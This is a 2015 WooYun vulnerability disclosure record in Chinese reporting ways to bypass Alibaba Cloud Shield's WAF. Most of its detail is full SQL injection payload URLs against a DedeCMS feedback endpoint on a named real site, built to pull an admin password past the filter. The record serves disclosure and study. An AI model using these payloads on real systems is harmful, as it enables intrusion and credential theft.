{"id": 70417, "wybug_id": "wooyun-2015-0122651", "wybug_title": "阿里巴巴云盾防御策略可以bypass #3", "wybug_corp": "阿里巴巴", "wybug_author": "izy", "wybug_date": "2015-07-06 19:21", "wybug_open_date": "2015-10-05 18:14", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向公众公开  简要描述： :) 详细说明：  使用这个dede的注入进行测试First bypass:首先访问：http://www.fywealth.cn/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',uptade(select( union select passwordxxxxxfromxxxxadmin limit 1)))%23看到被拦截了，说明阿里云waf对union select 已经不是像之前那样只考虑单词边界问题了。所以我们之恩能够放弃union进行注入的方式。而在insert update这样的注入是不需要union的，所以我们来测试一下这样注入。访问此url：http://www.fywealth.cn/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select passwordxxxxfromxxxadmin limit 1)))%23看到成功发出去了，说明这样的语句只是对单词边界的检测，这样就增加了我们绕过的几率。我们再访问此url(用%a0来填充空格，前面加update来确认语句是否发送到客户端)：http://www.fywealth.cn/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select password from%a0admin limit 1)))%23可以看到成功bypass了\n\nSecond bypass:测试上一次的： WooYun: 阿里巴巴云盾防御策略可以bypass（实例证明） 对于这样的(select(select{x pwd}from{x %23@__admin}+limit+1)注入语句确实修复了。但是fuzz的时候发现这样一个问题：select{x pwd}from{x %23@__admin}语句中，如果去掉空格也就bypass了比如这样select{pwd}from{admin}就不会拦截，猜测是否增加了一个规则专用来对抗这样语句?像select{xx xxx}from{xxx xxx}这样就拦截，但是对于含有空格检测的正则中有多种bypass方式例如：select{x%a0comment}from{x%a0guestbook}limit 1这样也是可以查出数据的访问：http://www.fywealth.cn/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0','x' update(select(select{x%0acomment}from{x%0aguestbook}limit 1))%23也成功bypass\n\n本地测试这样的语句：select{x%0acomment}from{x%0aguestbook}limit 1成功执行了，也影响了数据，\n\n   漏洞证明：  \n\n   修复方案：  总感觉针对单个注入poc的方法不好,每出现一个新特性就要加一个新规则，但是为了用户体验也不知道有没有双赢的方法。   版权声明：转载请注明来源 izy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-07-07 18:13 厂商回复： 您好，经确认，已有白帽子在ASRC提交了该漏洞，属于重复上报。感谢您对阿里巴巴安全的支持与关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-06 23:50 |    \t\tizy \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:22        | http://1zy.pw/)\t\t \n  审核了半个多月..已经提交asrc了T_T 不过审核通过了也好 大家一起学习    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}